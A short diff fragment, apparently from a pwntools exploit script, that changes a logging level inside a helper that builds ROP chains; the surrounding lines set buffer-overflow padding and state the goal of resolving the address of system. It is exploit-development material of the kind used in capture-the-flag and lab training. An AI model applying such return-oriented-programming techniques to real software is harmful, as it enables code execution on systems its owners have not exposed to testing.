@@ -26,7 +26,7 @@ padding = cyclic(cyclic_find('kaab'))
 rex  = ELF(binary)
 
 def myrop(base = None):
-    with context.local(log_level = 'silent'):
+    with context.local(log_level = 'error'):
         return ROP(rex, base = base)
 
 # Our goal from here is to dynamically resolve the address for system
